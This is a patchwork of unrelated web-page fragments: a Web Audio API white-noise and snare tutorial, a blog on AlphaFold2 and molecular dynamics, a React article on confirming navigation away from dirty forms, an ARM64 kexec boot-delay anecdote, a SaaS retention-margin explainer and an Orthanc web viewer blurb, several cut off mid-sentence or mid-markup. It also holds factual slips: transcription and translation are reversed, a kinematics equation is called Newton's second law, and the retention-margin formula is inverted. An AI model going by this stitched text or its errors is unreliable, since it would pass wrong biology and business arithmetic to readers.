<span>const</span> buffer <span>=</span> audioContext<span>.</span><span>createBuffer</span><span>(</span>
  <span>1</span><span>,</span>
  <span>SAMPLE_RATE</span> <span>*</span> timeLength<span>,</span>
  <span>SAMPLE_RATE</span>
<span>)</span><span>;</span></code></pre></div>
<p>This gives us a mono (one channel) buffer that holds 1 second worth of audio data.</p>
<p>If we wanted to read the data in the buffer (which is currently empty), we could use the <code>.getChannelData()</code> method. We need to pass in <code>0</code> to specify which channel we want data for. This returns a <code>Float32Array</code> where each item is a number representing the level of that sample.</p>
<div data-language="js"><pre><code><span>const</span> channelData <span>=</span> buffer<span>.</span><span>getChannelData</span><span>(</span><span>0</span><span>)</span><span>;</span>
</code></pre></div>
<p>We can then mutate the channel data directly. By assigning a random value between -1 and 1, we can create white noise.</p>
<div data-language="js"><pre><code><span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> buffer<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
  channelData<span>[</span>i<span>]</span> <span>=</span> Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>2</span> <span>-</span> <span>1</span><span>;</span>
<span>}</span></code></pre></div>
<blockquote>
<p>Note: If our buffer had more than one channel, we would have to repeat this process for every channel.</p>
</blockquote>
<p>Now we have a snippet of audio that contains one second of white noise. There’s still more that we need to do before we can play it.</p>
<h2>Creating Audio Nodes</h2>
<p>We can now create a buffer source, which is an audio node that handles playing our audio buffer.</p>
<div data-language="js"><pre><code><span>const</span> whiteNoiseSource <span>=</span> audioContext<span>.</span><span>createBufferSource</span><span>(</span><span>)</span><span>;</span>
whiteNoiseSource<span>.</span>buffer <span>=</span> buffer<span>;</span></code></pre></div>
<p>We can now connect this audio node to another audio node, including the audio context destination node. The destination node is a special node that is attached directly to the audio context. It represents whatever speakers are configured to play audio on our users computer.</p>
<p>Before we connect our white noise to the destination, we’ll want to turn the volume down to make sure we don’t blow our eardrums out. We’ll create a gain node, which lets us control the volume. Then we’ll connect our audio source node to the gain, and connect it to the destination node.</p>
<div data-language="js"><pre><code><span>const</span> primaryGainControl <span>=</span> audioContext<span>.</span><span>createGain</span><span>(</span><span>)</span><span>;</span>
primaryGainControl<span>.</span>gain<span>.</span><span>setValueAtTime</span><span>(</span><span>0.05</span><span>,</span> <span>0</span><span>)</span><span>;</span>

whiteNoiseSource<span>.</span><span>connect</span><span>(</span>primaryGainControl<span>)</span><span>;</span>
primaryGainControl<span>.</span><span>connect</span><span>(</span>audioContext<span>.</span>destination<span>)</span><span>;</span></code></pre></div>
<p>You might be wondering why we’re using the strange <code>setValueAtTime</code> method. The Web Audio API is designed to orchestrate complex changes the parameters of the audio nodes. The <code>gain</code> property on our gain node is an <a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioParam" rel="nofollow">AudioParam</a> and has a lot of other methods which make it possible to adjust different audio node parameters in controlled ways.</p>
<p>The first parameter of the <code>setValueAtTime</code> is the value we are setting; in this case, the gain. The gain value is unitless, and the amplitude of the audio that passes through our gain node is multiplied by that gain value. Using a value less than 1 decreases the volume; greater than 1 would increase the volume.</p>
<p>The second parameter is the time that the value is set, based on the internal clock of the audio context. This allows us to precisely schedule changes to the properties of our various audio nodes. Using 0 here sets the gain value at the very start of our audio.</p>
<p>If you’ve been following along, you might be expecting some noise to come out of your speakers right now. Just connecting our audio node to the destination doesn’t make it play - you have to call the <code>start</code> method on the source node. Let’s create a button that we can click to play the sound.</p>
<div data-language="js"><pre><code><span>const</span> button <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"button"</span><span>)</span><span>;</span>
button<span>.</span>innerText <span>=</span> <span>"White Noise"</span><span>;</span>
button<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  whiteNoiseSource<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>button<span>)</span><span>;</span></code></pre></div>
<p>Click the button, and you should hear <del>music to your ears</del> generated white noise!</p>
<p>…But if you click the button again, you get an error. You can only play a source node once. Fortunately, they are cheap to create, and we can still use the same audio buffer. We’ll just create it inside our button’s event listener.</p>
<div data-language="js"><pre><code>button<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> whiteNoiseSource <span>=</span> audioContext<span>.</span><span>createBufferSource</span><span>(</span><span>)</span><span>;</span>
  whiteNoiseSource<span>.</span>buffer <span>=</span> buffer<span>;</span>
  whiteNoiseSource<span>.</span><span>connect</span><span>(</span>primaryGainControl<span>)</span><span>;</span>

  whiteNoiseSource<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>

<p>Now you can click all you want.</p>
<h2>Creating a Snare Sound with Filters</h2>
<p>Snare drums create their signature rattle using several springs that are held taught underneath the drum. Old 8-bit games would use a white noise generator to create a snare sound, as you can hear in <a href="https://www.youtube.com/watch?v=z4hsGK8A1qY" rel="nofollow">this 8-bit remix of a classic song</a>.</p>
<p>White noise is nice, but it doesn’t sound much like any kind of musical instrument. We can build on our white noise generator to create a snare sound, using filters.</p>
<p>In audio processing, a filter is some process which changes an audio signal in some way. We can use a highpass filter to cut off all of the noise that exists below a certain frequency, leaving us with just the high frequencies of noise. We can create this filter using the <code>BiquadFilterNode</code> audio node.</p>
<p>To help tell the difference, lets create another button.</p>
<div data-language="js"><pre><code><span>const</span> snareFilter <span>=</span> audioContext<span>.</span><span>createBiquadFilter</span><span>(</span><span>)</span><span>;</span>
snareFilter<span>.</span>type <span>=</span> <span>"highpass"</span><span>;</span>
snareFilter<span>.</span>frequency<span>.</span>value <span>=</span> <span>1500</span><span>;</span> 
snareFilter<span>.</span><span>connect</span><span>(</span>primaryGainControl<span>)</span><span>;</span>


<span>const</span> snareButton <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"button"</span><span>)</span><span>;</span>
snareButton<span>.</span>innerText <span>=</span> <span>"Snare"</span><span>;</span>
snareButton<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> whiteNoiseSource <span>=</span> audioContext<span>.</span><span>createBufferSource</span><span>(</span><span>)</span><span>;</span>
  whiteNoiseSource<span>.</span>buffer <span>=</span> buffer<span>;</span>
  whiteNoiseSource<span>.</span><span>connect</span><span>(</span>snareFilter<span>)</span><span>;</span>

  whiteNoiseSource<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>
document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>snareButton<span>)</span><span>;</span></code></pre></div>
<p>Go ahead and click on the buttons to hear the effect that the highpass filter has.</p>
<p>There are several other filters built into the BiquadFilterNode, which you can explore on <a href="https://developer.mozilla.org/en-US/docs/Web/API/BiquadFilterNode" rel="nofollow">the MDN page</a>.</p>
<h2>Generating Kick Drums with Oscillators</h2>
<p>We aren’t quite done with our snare yet, but we’re going to take a little diversion and create our kick drum sound. The kick sound will be a low pitched hum. We could create that ourselves using another audio buffer and a sine function, but the Web Audio API gives us tools that make this a lot easier.</p>
<p>Let’s start by creating a button. Inside the button’s click event listener, we’ll create an oscillator node. …</p></div></div>

<h2 id="tldr">TLDR</h2>

<p>Just yesterday, Deepmind published a <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">blog</a> talking about how their AI, AlphaFold2, predicted protein structures in the biennial CASP challenge this year with stunning accuracy. There’s been a lot of buzz in the computational science community discussing the ramifications of their work.</p>

<p>If you’ve seen the buzz and are curious about protein folding, read on…
This post is supposed to capture the motivation and complexity of the problem for an audience familiar with STEM in some way.</p>

<p>Majorly, this is a post close to my heart since protein folding is the broad problem in which I did my Masters’ research. It is the first topic of research I worked in and therefore love talking about!</p>

<hr>

<h2 id="quick-introduction">Quick introduction</h2>

<p>Proteins are fundamental to life, as they quite literally <a href="https://www.youtube.com/watch?v=X_tYrnv_o6A">DO things in the body</a>. They transport molecules, help decode the DNA, and digest the food. Infact, they sit at the functional end of the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of biology</a>(i.e. DNA-&gt; RNA -&gt; Protein ; DNA is translated into RNA which is transcribed into proteins)
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Cdmb.svg/1280px-Cdmb.svg.png" alt="Central Dogma of Biology"></p>

<h2 id="the-fuss-about-structures">The fuss about structures</h2>
<p>If you remember high school, they fold into intricate (quaternary) structures that are highly important to their funciton. Structure matters since a lot of what proteins do as mid-sized molecules depend on them mechanically <strong>docking</strong> with other molecules(throwback to coordinate chemistry!). They exist at a size regime that is a fascinating grey area of where mechanical and chemical effects both matter!
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/Docking_representation_2.png/1280px-Docking_representation_2.png">
Common drugs use this fact. For example, they will try to bind competitively with the target of a protein hence preventing its action (that’s how your coffee works!) or attach to a protein at a different site and alter its structure, rendering it useless.</p>

<h2 id="the-fault-in-our-structures">The fault in our structures</h2>
<p>Now proteins are manufactures in ribosomes, at immense speed, with immense precision. But chemical machinery is not without folly. So sometimes it makes mistakes. The sequence stays the same, but like a bead of strings that can be arranged in anyway, it can be misfolded. Misfolded proteins, as you can guess, malfunction! For diseases like Alzhiemer’s, the misfolding of one protein and its aggregation in the brain is one of the primary candidates of being the root cause.</p>

<p>This just means, that studying the 3-D structure of proteins is of high importance. It is also important to study the path taken by proteins to fold that way.</p>

<h2 id="methods-of-measurement">Methods of measurement</h2>
<p>To see particles that small, NMR and XRAY-crystallography are usually used. Both these methods fall short in:</p>
<ol>
  <li>Being able to capture the entire dynamics of a protein. i.e., WATCH the folding process happen; since the timescales are too short.</li>
  <li>Giving a model that can help predict the 3-d structure of a protein given its sequence</li>
  <li>Providing insights into other “meta-stable” conformations which the protein may assume owing to random forces.</li>
</ol>

<p><strong>NB : NMR is able to capture proteins dynamics technically. I’m not too familiar with the shortcomings of solution state NMR. If you have questions though, I’d be happy to point you to my friends in TIFR Hyderabad’s National NMR facility who can help answer questions.</strong></p>

<p>These measurements are important because they can help us understand WHY a protein misfolded, and also, how a mutated protein could look folded and thus behave!</p>

<h2 id="enter-computers">Enter, Computers!</h2>

<p>Since experimental methods don’t answer these questions, we turn to computational methods. What is done is actually incredibly fascinating!</p>

<p>We model all the atoms as known in a protein as tiny spherical masses, and model the forces between them including electrochemical bonds, nuclear repulsion and weak forces like van der waal forces. Then, we essentially solve newton’s second equation of motion(YEP, the one from 9th grade : \(s_t = u_t + 0.5 * a* t^2\) ) albeit with a different algebraic formulation, for each of the atoms to predict their trajectory in time</p>

<p>Now, if you were using this equation to study a ball thrown into the air and predict it’s entire trajectory, you would want to solve this equation for millisecond intervals, to “see” the ball fly up and then come back down in frames. If you were to take a second interval, the snapshots you would predict would be too far apart.</p>

<p>Similarly for the atoms, since you want to capture the smallest relevant motion, you solve for 2-femto-second intervals, that is the timescale at which molecular bonds move owing to the energy from room temperature heat. This may all seem well and good but it is not!
 IF you were to use a perfect model so that it predicts the real thing, you’d still be modelling a molecule in pure vaccum. However, in the body, all of this exists in a water medium. And in water, properties change because of water’s dipole and kinetic interactions with the system. 
<img src="https://ars.els-cdn.com/content/image/1-s2.0-S1471489210001463-gr1.jpg"></p>

<p>So, you guessed it, the model is made to contain 10s of thousands of water molecules, arranged in a repeating cube, so that the (ideally) modelled system mimics what the molecule will feel inside a living system.</p>

<p>Now, here we have 100s of thousands of particles, with pairwise forces defined for them, that too not just of one kind. From those, we predict their position 2 femto seconds later. Cool. But for how many steps do we have to see this? Well, events of interest such as folding happen at timescales of microseconds to miliseconds. That means, you’d have to do 10^10 iterations of this system to see meaningful events happening.</p>

<h2 id="the-curse-of-dimensionality">The curse of dimensionality</h2>

<p>This method of modelling and simulating trajectories is called <a href="https://en.wikipedia.org/wiki/Molecular_dynamics#:~:text=Molecular%20dynamics%20(MD)%20is%20a,%22evolution%22%20of%20the%20system.">Molecular Dymanics</a></p>

<p>It would be obvious by now that the amount of computational horsepower these simulations takes is so huge that reserachers rely on highly distributed computing to get any useful information. Many labs use accesses to super computers while companies like D.E.Shaw reserach built a special hardware called <a href="https://en.wikipedia.org/wiki/Anton_(computer)">Anton</a> right in the heart of Manhattan to simulate their molecules.</p>

<p>Vijay Pande’s(A16Z) lab from Stanford took the crowdfunding approach with the <a href="https://foldingathome.org/"> Folding at Home </a> Project to allow users to lend their extra computational capacity to contribute to folding proteins from home.</p>

<h2 id="theoretical-work-arounds">Theoretical work-arounds</h2>

<p>Yet other fields exist where in this problem is formalised in a way to reduce computational requirements. The problem of seeing rare events like folding can be formalised through statistical mechanics to be a problem of sampling from a high dimensional probability distribution where we don’t know the entire distribution, but we have a generator which can generate a new random(almost) draw. The simulation generates these states. There are ways that you can use to make this generator generate rarer samples, by let’s say turning up the heat in the system to make the molecules vibrate faster.</p>

<p>Another major way people approach this problem is to think of it in terms of dimensionality reduction, in that a lot of the internal motion of the molecule is actually irrelevant and the true dynamics of the system happen in lower dimensions that capture true transitions. These lower dimensions can be chemical at times, like the dihedral angles on the peptide bonds of 2 amino acids.</p>

<p>Back in IIIT, the approach I worked on with my advisor Dr. Prabhakar Bhimalapuram was trying to use multiple “replicas” of the same system, with a repulsive force between them to make them sample divergent areas of the probability landscape. Here’s a <a href="http://web2py.iiit.ac.in/research_centres/publications/view_publication/mastersthesis/680">link</a> if you’re interested in reading more.</p>

<h2 id="now-comes-in-ai">Now comes In AI.</h2>
<p>AI could help solve the issue in many ways :</p>
<ol>
  <li>Help identify lower dimensions in which to simulate and understand the system</li>
  <li>Predict rare events given a simulated system</li>
  <li>Directly predict folded states</li>
</ol>

<p>The third method is what Deepmind’s AlphaFold2 has done. It is a complex model that treats the molecular structure as a spatial graph and is then trained using ~170,000 protein structures available publicly. Using that they predicted structures in the CASP14 challenge with incredible and astonishing accuracy. Their own blog contains details of all the incredible results they have and links to their previous paper.</p>

<h2 id="perspective">Perspective</h2>

<p>Deepmind has been able to achieve via computational magic, something that we watch nature do in the blink of an eye. Of course, that’s a trite and an unverifiable take on the universe’s functioning. 
However, the real ramifications are huge. If it is true that we know the first principles that govern the universe, and have such methods as shortcuts to make predictions about what nature would have made given those first principles, we have a complete toolkit! With these 2 you can study molecules with remarkable detail. 
It not only opens avenues in understanding nuances of what is already there, but also give a huge boost to synthetic biology.</p>

<p>We would be able to predict the structures of faulty proteins based on  mutations from the genes encoding them. On that, free energy calculations(from the MD regime) could lend us enormous power to predict their behavior in organisms and predict drug targets.</p>

<p>We can enter the regime of large-molecule therapeutics. With this tool, we would be able to design synthetic proteins, predict how they fold, and use them as candidates for all sorts of drugs in the body!</p>

<p>As usual, our ability to predict the future is severely limited!</p>

  <p>Making it easy for users to destroy their work in a single click violates one of the most basic usability principles, which is to respect and protect the user’s work at almost any cost.<br>

</blockquote>

<p>Mistakes happen. Discarding a user’s form data when he or she attempts to navigate away from the page—perhaps accidentally—can lead to frustrated users, lower form response rates, and abandoned carts.</p>

<p>Many web forms prompt for confirmation before accepting requests to navigate away from the form. These warnings improve the application’s user experience. Unfortunately, they are not trivial to implement. Single-page applications, in particular, must handle navigation within the application as well as external navigation.</p>

<p>This article implements a web form navigation confirmation using TypeScript and React. Traditional web applications are covered first. This solution is then extended to work for single-page applications.</p>

          Preventing form data loss in traditional multi-page web applications <a href="#preventing-form-data-loss-in-traditional-multi-page-web-applications">🔗</a>
        
        
      </h2>

<p>In a traditional web application, users interact with the server by requesting and receiving wholly-formed HTML documents. The user may request and receive other resources such as images or JavaScript files, but each discrete interaction between client and server will result in an HTML document that can be processed and rendered by the browser.</p>

<p>This model of navigation is relatively straightforward:</p>

<ul>
  <li>Resources are offered to the user via URLs.</li>
  <li>Navigating to a new URL will unload the current document and replace it with a new document from the server.</li>
  <li>The current document’s URL can be tracked by the browser and displayed to the user via the address bar.</li>
</ul>
    
      <h3 id="dom-events">
        
        
          DOM events <a href="#dom-events">🔗</a>
        
        
      </h3>

<p>Requesting and rendering documents from the server is not the only function of the web browser. Even though client/server interactions result in the loading of a new page in traditional web applications, client-side scripting is still often employed to improve the UI/UX associated with displaying the server’s data or facilitating the user’s next request.</p>

<p>Modern browsers allow client-side scripts to track and react to many actions that occur within the context of the web page via DOM events. Common examples include reacting to user mouse clicks or keypresses, but DOM events also exist for actions handled by the browser itself such as loading or unloading a document, monitoring the user’s connection, etc. As of November 2020, <a href="https://developer.mozilla.org/en-US/docs/Web/Events">MDN</a> lists 191 events in the “Standard” category representing events defined in official Web specifications which should be supported by standards-compliant browsers.</p>
    
      <h3 id="the-beforeunload-event">
        
        
          The beforeunload event <a href="#the-beforeunload-event">🔗</a>
        
        
      </h3>

<p>The <code>beforeunload</code> event is particularly useful for preventing form data loss. As the name would imply, this event is fired before the current page is unloaded. It prompts the user, who is then able to cancel or confirm the navigation.</p>

<p>At first glance, this is a perfect solution. An event handler can be implemented that checks if the user has provided input. If so, it can prompt for confirmation before unloading the page. However, there are a few caveats.</p>

<p>Most DOM event handlers are flexible. With the right JavaScript, clicking a button could submit a form, change the background image, or navigate to an entirely different page. The <code>beforeunload</code> event is much more restrictive. While a developer <em>could</em> place arbitrary code within the handler, the user will be given a generic confirmation box regardless of the additional code.</p>

<p>This is for good reason! One could imagine a nefarious developer blocking all attempts to navigate away from a page if the event allowed more flexibility.</p>

<p>Earlier browsers limited the outcome to a dialog box but allowed custom text within that dialog. Even this presents a risk. The aforementioned developer could place misleading or annoying text in the confirmation.</p>

<blockquote>
  <p>Your account is currently being upgraded. Navigating away from the site before the upgrade is finished could permanently disable your access! Click “OK” to risk breaking your account.</p>
</blockquote>

<blockquote>
  <p>It looks like you are leaving. Our service is best in class, so this must be a mistake!!!</p>
</blockquote>

<p>A particularly devious developer could even word the confirmation so that the user believes that the confirm/cancel operations are inverted, leading the user to cancel the navigation despite wanting to proceed.</p>

<p>The browser may even choose not to display the confirmation dialog at all, particularly if the user does not appear to have interacted with the page. This bias to conservatism is specifically encouraged by the HTML standard.<sup><a href="#footnotes">1</a></sup></p>

<p>As a final word of caution, setting this event listener currently renders the page “unsalvageable” meaning that it will likely not be reused if the user navigates back during the same session. <a href="https://github.com/whatwg/html/pull/5889">This may be changing soon</a> and is likely not a meaningful concern for most applications.</p>

<p>Despite these minor inconveniences to the developer, <a href="https://caniuse.com/?search=beforeunload">the event is widely supported</a>, and the restrictions likely make the web a much more user-friendly place than it would be without them.</p>
    
      <h3 id="browser-support">
        
        
          Browser support <a href="#browser-support">🔗</a>
        
        
      </h3>

<p>Although the event has broad browser support, there are minor differences in the interface it exposes. <a href="https://html.spec.whatwg.org/#the-beforeunloadevent-interface">According to the specification</a>, invoking the event’s <code>preventDefault</code> method is both necessary and sufficient to indicate that the page desires to show a confirmation. Most browsers <a href="https://caniuse.com/mdn-api_window_beforeunload_event_preventdefault_activation">choose to ignore this guideline</a>. Alternative approaches include <a href="https://caniuse.com/mdn-api_window_beforeunload_event_return_string_activation">returning a string</a> and assigning a string <a href="https://caniuse.com/mdn-api_window_beforeunload_event_event_returnvalue_activation">to the event’s <code>returnValue</code> property</a>. As a practical matter, it is best to implement all three approaches to improve browser coverage.</p>
    
      <h3 id="implementing-the-useunloadconfirmation-hook">
        
        
          Implementing the <code>useUnloadConfirmation</code> hook <a href="#implementing-the-useunloadconfirmation-hook">🔗</a>
        
        
      </h3>

<p>Having made it through all the background, we can finally implement the hook.</p>

<div><div><pre><code><span>import</span> <span>{</span> <span>useEffect</span> <span>}</span> <span>from</span> <span>'</span><span>react</span><span>'</span>

<span>const</span> <span>handleEvent</span> <span>=</span> <span>(</span><span>e</span><span>:</span> <span>BeforeUnloadEvent</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>e</span><span>.</span><span>preventDefault</span><span>()</span>

    <span>// This custom message will only be used in older browsers</span>
    <span>const</span> <span>message</span> <span>=</span> <span>"</span><span>Your changes may not be saved.</span><span>"</span>

    <span>e</span><span>.</span><span>returnValue</span> <span>=</span> <span>message</span>
    <span>return</span> <span>message</span>
<span>}</span>

<span>export</span> <span>const</span> <span>useUnloadConfirmation</span> <span>=</span> <span>(</span><span>shouldPrompt</span><span>:</span> <span>boolean</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>eventName</span> <span>=</span> <span>'</span><span>beforeunload</span><span>'</span>
    <span>useEffect</span><span>(()</span> <span>=&gt;</span> <span>{</span>
        <span>if</span> <span>(</span><span>shouldPrompt</span><span>)</span> <span>{</span>
            <span>window</span><span>.</span><span>addEventListener</span><span>(</span><span>eventName</span><span>,</span> <span>handleEvent</span><span>)</span>
            <span>return</span> <span>()</span> <span>=&gt;</span> <span>{</span>
                <span>window</span><span>.</span><span>removeEventListener</span><span>(</span><span>eventName</span><span>,</span> <span>handleEvent</span><span>)</span>
            <span>}</span>
        <span>}</span>
    <span>},</span> <span>[</span><span>shouldPrompt</span><span>])</span>
<span>}</span>
</code></pre></div></div>

<p>The <code>useUnloadConfirmation</code> hook accepts a single parameter indicating if the confirmation should be shown on navigation. This parameter will typically represent whether the form is “dirty” or not. The hook runs an internal <code>useEffect</code> whenever the value of <code>shouldPrompt</code> changes. This <code>useEffect</code> hook adds a handler that runs on <code>beforeunload</code> events. It returns a clean-up function that removes the listener when <code>useEffect</code> runs next or the component unmounts.</p>

<p>Consuming the custom hook is as simple as adding a line to each relevant form component.</p>

<div><div><pre><code><span>const</span> <span>{</span> <span>formIsDirty</span> <span>}</span> <span>=</span> <span>FormLibraryOfChoice</span><span>()</span>
<span>useUnloadConfirmation</span><span>(</span><span>formIsDirty</span><span>)</span>
</code></pre></div></div>
    
      <h2 id="single-page-application-navigation">
        
        
          Single-page application navigation <a href="#single-page-application-navigation">🔗</a>
        
        
      </h2>

<p>The <code>useUnloadConfirmation</code> hook provides a lot of functionality in a small amount of code, but it makes an important assumption: navigation that could cause data loss is preceded by a page unload event.</p>

<p>This assumption tends to hold for traditional web applications. Single-page applications (SPAs), however, were created specifically to violate this assumption.</p>

<p>SPAs create the illusion of navigation—changing the URL and title, displaying new content, etc.—without prompting the page to reload. Without an <code>unload</code> event ever firing, it should be fairly obvious that <code>useUnloadConfirmation</code> will not be effective.</p>

<p>Instead of loading separate HTML documents to retrieve and display content, SPAs load an initial document which is then incrementally updated using client-side scripting combined with AJAX requests. “Navigation” within this single, ever-evolving document is typically handled via the History API.</p>

    <figcaption>Figure 1: In a single-page application, navigation can occur via a page unload/load cycle or the History API.</figcaption>
</figure>
    
      <h3 id="the-history-api">
        
        
          The History API <a href="#the-history-api">🔗</a>
        
        
      </h3>

<p>Web browsers keep an ongoing list of addresses visited by the user during the current session. This list allows users to traverse their browsing history using the browser’s “back” and “forward” buttons.</p>

<p>The History API provides a mechanism to view and mutate this list (with restrictions). As a simple example, an SPA could implement a navigation bar with several “links.” Clicking these links does not navigate to a separate document. Instead, it fires a <code>click</code> DOM event which notifies the page’s JavaScript to display new content and uses the History API to modify the URL shown in the address bar.</p>

      </h3>

<p>Since any calls to the History API are handled by the page’s JavaScript, which also typically handles determining when navigation should be blocked, there is a conceptually straightforward approach to preventing form data loss: wrap all calls to the History API in code that checks if the page has indicated navigation should be blocked.</p>

<p>Many developers will use a specialized library to handle SPA navigation rather than working directly with the History API. The examples below use React Router and, specifically, its <code>history</code> package.

    <p>This is one of the unforgettable experience in my engineering life. Last year when we brought-up a ARM64 based platform, we faced lots of hurdles. But this one was very interesting and had lots of surprises. Though this triaging effort tolled multiple frustrating days, I had very good learning. I had to understand <code>kexec_load</code> system call, kernel reboot path and kernel early boot path to root cause the issue. We were using 4.14.19 kernel for the bring-up. But I’ll give code samples from 5.4.14 as it is latest. There is no much code difference.</p>
<p>The boot flow of our new platform was <code>uboot --&gt; service Linux --&gt; main Linux</code>. We had <code>service Linux</code> to offload major hardware initialization work from the bootloader. Also to keep that code platform agnostic [same <code>service Linux</code> ran on x86 platforms too].</p>
<p>To make the jump from <code>service Linux</code> to <code>main Linux</code> we used <code>kexec</code>. The problem here was it took almost 2 minutes for the <code>main Linux</code> to start booting. This was a significant difference while comparing with x86 platforms. And this kind of delay would definitely annoy our customers.</p>
<p>After hundreds of rebuilds and thousands of print statements, I found the cause and fixed the issue. Now that 2 minutes delay was reduced to 4 seconds. Let me just tell you the code flow rather dump you with my debugging methods. I kept deferring from writing this article for almost an year. Because I was afraid of the code references and connecting them to show the flow.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-ix="fade-in-blog-post" id="continue-reading" data-w-id="090c74fd-0c24-ef76-0192-8c569ddeea91"><div><div data-ix="hide-blog-content-block" id="read-post"><div><div><p>Last week we added Gross Margins to our ever growing <a href="https://talkinsaasy.com/saasy-math" target="_blank">SaaSy Math</a> resource page. Gross Margin is a widely used and reported metric, but to truly understand take home profits in the SaaS/Subscription business model we need to take our analysis to the next degree, Retention Margin. Because the subscription business model means customers can (more) freely come and go, subscription startups are in a constant battle to retain these customers (Think Jon Snow in the Battle of the Bastards). Retention margin is the percentage of revenue left after your CORS (gross margins) plus subtracting out your cost to retain a customer (Customer Service, Success, and Marketing) are taken off of your top-line revenue. We will also examine what retention margins analysis across customer segments can help us understand about our customer base.</p><p>Retention margin is important to understand across customer segments similar to CAC because it could reveal customer segments that are “leaky buckets”, or simply, they cost more to keep as a customer than is worth the revenue they generate. Similar to our LTV:CAC ratio, you want to try and understand your retention revenue (customer revenue x retention margin) CAC payback period to make sure that what appear to be high paying customers aren’t costing you so much to retain that they actually could put the business in the red. Below is an example of how retention margins can impact your revenue analysis:</p><figure><p><img alt="CAC Payback without Retention Margins" src="https://uploads-ssl.webflow.com/5fac0bd00b5e8b8e9995239c/5faed3a033b57805d04d987d_CAC%2BPayback%2Bwo%252FRetention%2BMargin.png"></p><figcaption>CAC Payback without Retention Margins</figcaption></figure><figure><p><img alt="CAC Payback with Retention Margins" src="https://uploads-ssl.webflow.com/5fac0bd00b5e8b8e9995239c/5faed3a00d44ee0b402e7b7a_CAC%2BPayback%2Bw%252FRetention%2BMargin.png"></p><figcaption>CAC Payback with Retention Margins</figcaption></figure><p>As you can see in the above area the the customer with the shorter CAC payback period changes when you factor retention margins into your analysis. While Customer A has higher MRR and on top-line revenue looks to have a more attractive CAC payback, what if they submit a bunch more service tickets and spend a lot more time with your customer success and service team which comes at a cost to you? With an 18% lower retention margin, Customer A actually takes longer to payback its CAC than Customer B despite Customer B’s lower MRR number. While a lower CAC payback doesn’t always mean a better customer segment, this is an example of how incorporating retention margins can change the picture of your customer analysis and can provide more context as to how different customer segments are behaving.</p><p>Calculating retention margin is similar to CAC, just looking at Customer Success, Service and Marketing cost (instead of sales and marketing) over a given time period and finding the average number of customers you had each month for that same time period. The formula you want to use is as follows:</p><p><strong>Retention Margin = Top-line Revenue / (Gross Revenue (Revenue - CORS) - Service Cost - Success Cost - Marketing Cost)</strong> </p><p>To find these costs, similar to CAC, you can take financial data to calculate the cost of payroll and other expenses for your Success and Service teams as well as customer marketing spend and plug them into the formula above. You should already have your Gross Margins calculated, if not you can refer to our <a href="https://talkinsaasy.com/saasy-math" target="_blank">SaaSy Math</a> resource to find that formula. One way to help find problematic customer segments is to analyze the Gross-Retention Gap, or the difference between Gross Margins and Retention Margins for each customer segment. When you look at these gaps you can look to see if their is a segment that has a gross margin similar to other segments with a huge gross-retention gap resulting in a low retention margin. This is the result of higher service and success costs typically meaning that this customer segments submits high numbers of service tickets and might be struggling to use your product or service and you might not have product-market fit with this particular group. Segments with a high gross-retention gap might be worth an additional product usage breakdown to understand what is going on.</p><p>With retention margins you can more accurately understand your profitability as well as find the segments of customer that may be negatively impacting your business. We hope that this can be used as a resource to help you find your retention margins and if you have any questions on how to find your retention margins feel free to reach out to us on the <a href="https://talkinsaasy.com/contact" target="_blank">contact</a> page and we would be happy to help. This article was meant to start the conversation around retention margins and we ill be adding all of the formula’s and definitions to our <a href="https://talkinsaasy.com/saasy-math" target="_blank">SaaSy Math</a> page for future access and use if you want to use them as a resource.</p></div></div></div></div></div></div>]]>

      <p>
        This free and open-source plugin provides a cross-platform,
        zero-footprint Web viewer for medical images.
      </p>

      <p>
        Contrarily to most teleradiology solutions, the Stone Web
        viewer is mostly written in C++ thanks
        to <a href="https://en.wikipedia.org/wiki/WebAssembly" target="_blank">WebAssembly</a>. Internally, this viewer is
        the first application to leverage
        the <a href="https://www.orthanc-server.com/static.php?page=stone">Stone of Orthanc</a>
        library.
      </p>

      <p>
        Contrarily to
        the <a href="https://www.orthanc-server.com/static.php?page=orthanc-web-viewer">Orthanc Web
        viewer</a> and to the
        deprecated <a href="https://www.orthanc-server.com/static.php?page=osimis-web-viewer">Osimis
        Web viewer</a>, it does not require server-side computations,
        as it uses the

                <div>
